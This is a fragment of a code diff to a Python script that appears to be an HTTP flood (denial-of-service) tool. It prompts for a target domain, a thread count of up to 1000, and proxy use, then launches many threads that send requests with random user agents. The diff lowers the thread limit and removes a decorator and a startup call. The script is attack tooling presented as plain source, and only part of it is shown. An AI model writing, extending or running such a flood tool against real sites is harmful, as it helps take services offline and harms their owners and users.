@@ -144,18 +144,17 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 10000]: "))
+    threads = int(input("Threads[max 1000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 10000:
+if threads == 0 or threads > 1000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
 bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
-@njit
 def startthreads(bar, url, threads):
     print(colorama.Fore.YELLOW + "Starting threads...")
     if proxyuseage == 1:
@@ -168,8 +167,6 @@ def startthreads(bar, url, threads):
             thr2.start()
     print(colorama.Fore.GREEN + "All threads are running!")
     print(Style.RESET_ALL)
-
-startthreads(bar, url, threads)
 
 while True:
     useragent = random.choice(headersp)
